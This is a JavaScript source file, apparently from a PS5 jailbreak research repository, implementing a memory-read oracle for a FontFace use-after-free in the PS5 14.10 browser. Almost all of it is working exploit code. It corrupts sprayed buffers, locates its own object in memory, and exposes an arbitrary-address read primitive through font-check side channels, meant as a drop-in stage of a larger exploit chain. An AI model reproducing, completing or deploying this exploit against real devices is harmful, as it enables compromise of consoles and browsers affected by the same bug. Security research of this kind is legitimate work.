// oracle_walki.js — PS5 14.10 FontFace UAF oracle (walk0 integration)
// CC BY-NC 4.0 — github.com/ZigZagBoi1/PS5-14.10-Research
//
// Drop-in for walk0.html: <script src="oracle_walki.js"></script>
// After the trigger fires and spray lands, call:
//   var o = initOracle(window.__sp, faces);
//   if (!o) { /* no leak or no oracle face */ return; }
//   // o.L1, o.L2, o.self, o.zi, o.bufs available
//   // rr(addr), s6p(rv), rf(rv), setR(addr), chk(c), put32(u,o,x), wr48(u,o,x)
//   // cleanup() before page unload
//
// Constraints:
//   ONE UAF per browser session (second triggers OOM)
//   Number-only arithmetic (BigInt hangs the PS5 browser)
//   Oracle cap 0x10FFFF — le32 values above this return E from rr()
//   s6p(rr(A)) = le48 at A+2, works only when target byte[0]=byte[1]=0
//   XO guard: never rr() into text_base..text_base+256MB (0x800000000..0x810000000)
//
// Known addresses (unit-specific, may differ on yours):
//   text_base  = 0x800000000 (FIXED on our unit; yours may have ASLR)
//   WPI        = 0x1000150000 (FIXED most boots, bmalloc slab header)
'use strict';

function le48(v, o) {
  return v[o] + v[o+1]*0x100 + v[o+2]*0x10000 +
         v[o+3]*0x1000000 + v[o+4]*0x100000000 + v[o+5]*0x10000000000;
}
function wr48(u, o, x) {
  for (var k = 0; k < 6; k++) { u[o+k] = x % 256; x = Math.floor(x / 256); }
  u[o+6] = 0; u[o+7] = 0;
}
function put32(u, o, x) {
  u[o] = x & 0xFF; u[o+1] = (x>>8) & 0xFF;
  u[o+2] = (x>>16) & 0xFF; u[o+3] = (x>>24) & 0xFF;
}
function align256(x) { return Math.floor(x / 256) * 256; }
function hex(x) { return '0x' + Math.round(x).toString(16); }

var _bufs = null, _zi = -1, _self = 0, _L1 = 0, _L2 = 0;

function setR(addr) {
  for (var i = 0; i < _bufs.length; i++) wr48(_bufs[i][0], 0x20, addr);
}
function chk(c) {
  try {
    return document.fonts.check('1em zz' + _zi, String.fromCodePoint(c)) === false;
  } catch (e) { return null; }
}
function rr(addr) {
  setR(addr);
  var c0 = chk(0), cM = chk(0x10FFFF);
  if (c0 && cM) return [0, 0x10FFFF];
  if (c0) {
    var lo = 0, hi = 0x10FFFF;
    while (lo < hi) { var m = (lo+hi+1)>>>1; if (chk(m)) lo = m; else hi = m-1; }
    return [0, lo];
  }
  if (cM) {
    var lo2 = 0, hi2 = 0x10FFFF;
    while (lo2 < hi2) { var m2 = (lo2+hi2)>>>1; if (chk(m2)) hi2 = m2; else lo2 = m2+1; }
    return [lo2, 0x10FFFF];
  }
  var seed = -1, v = 1;
  while (v <= 0x10FFFF) {
    if (chk(v)) { seed = v; break; }
    var v3 = v+v+v;
    if (v3 <= 0x10FFFF && chk(v3)) { seed = v3; break; }
    v = v*2;
  }
  if (seed < 0) return [-2, -2];
  var lo3 = 0, hi3 = seed;
  while (lo3 < hi3) { var m3 = (lo3+hi3)>>>1; if (chk(m3)) hi3 = m3; else lo3 = m3+1; }
  var fr = lo3;
  var lo4 = seed, hi4 = 0x10FFFF;
  while (lo4 < hi4) { var m4 = (lo4+hi4+1)>>>1; if (chk(m4)) lo4 = m4; else hi4 = m4-1; }
  return [fr, lo4];
}
function s6p(rv) {
  if (rv[0] === -2 || (rv[0] === 0 && rv[1] === 0x10FFFF)) return 0;
  var f = rv[0], t = rv[1];
  return ((f>>>16)&0xFF) + ((f>>>24)&0xFF)*256 +
         (t&0xFF)*65536 + ((t>>>8)&0xFF)*16777216 +
         ((t>>>16)&0xFF)*4294967296 + ((t>>>24)&0xFF)*1099511627776;
}
function rf(r) { return r[0] === -2 ? 'E' : r[0].toString(16) + '/' + r[1].toString(16); }

function findSelf(L1, L2) {
  var anchors = [align256(L1), align256(L2)];
  for (var an = 0; an < anchors.length; an++) {
    var cS = anchors[an] - 0x400000, cE = anchors[an] + 0x400000;
    if (cS < 0x10000) cS = 0x10000;
    for (var a = cS; a < cE; a += 128) {
      setR(a + 0x38);
      if (chk(0xBEEF) === true && chk(0xBEEE) === false &&
          chk(0xCAFE) === true && chk(0xCAFF) === false) {
        return a;
      }
    }
  }
  return 0;
}

function initOracle(sprayArr, faces) {
  var bufs = [], L1 = 0, L2 = 0;
  for (var i = 0; i < sprayArr.length; i++) {
    var a = le48(sprayArr[i], 0x58);
    if (a > 0x1000000000) {
      var b2 = le48(sprayArr[i], 0x68);
      if (L1 === 0) { L1 = a; L2 = b2; }
      bufs.push([sprayArr[i], b2, i]);
    }
  }
  if (!bufs.length) return null;
  for (var ib = 0; ib < bufs.length; ib++) {
    var vb = bufs[ib][0];
    vb[0] = 2; wr48(vb, 0x08, bufs[ib][1]); wr48(vb, 0x10, 0);
    vb[0x82] = 0; wr48(vb, 0x20, 0); put32(vb, 0x28, 0); put32(vb, 0x2C, 0);
  }
  for (var i2 = 0; i2 < faces.length; i2++) {
    try { faces[i2].family = 'zz' + i2; } catch (e) {}
  }
  for (var i3 = 0; i3 < faces.length; i3++) {
    try { document.fonts.add(faces[i3]); } catch (e) {}
  }
  var zi = -1;
  for (var q = 0; q < faces.length; q++) {
    var r = null;
    try { r = document.fonts.check('1em zz' + q, 'A'); } catch (e) { r = 'EX'; }
    if (r === false) { zi = q; break; }
  }
  if (zi < 0) return null;
  for (var ip = 0; ip < bufs.length; ip++) {
    bufs[ip][0][0x82] = 0;
    wr48(bufs[ip][0], 0x20, L2);
    bufs[ip][0][0x28] = 1; bufs[ip][0][0x2C] = 1;
  }
  put32(bufs[0][0], 0x38, 0xBEEF);
  put32(bufs[0][0], 0x3C, 0xCAFE);
  for (var iq = 1; iq < bufs.length; iq++) {
    put32(bufs[iq][0], 0x38, 0x1000);
    put32(bufs[iq][0], 0x3C, 0x2000);
  }
  _bufs = bufs; _zi = zi; _L1 = L1; _L2 = L2;
  _self = findSelf(L1, L2);
  return { L1: L1, L2: L2, self: _self, zi: zi, bufs: bufs };
}

function cleanup() {
  if (!_bufs || !_bufs.length) return;
  put32(_bufs[0][0], 0x38, 0xBEEF);
  put32(_bufs[0][0], 0x3C, 0xCAFE);
  if (_self) setR(_self + 0x38);
}
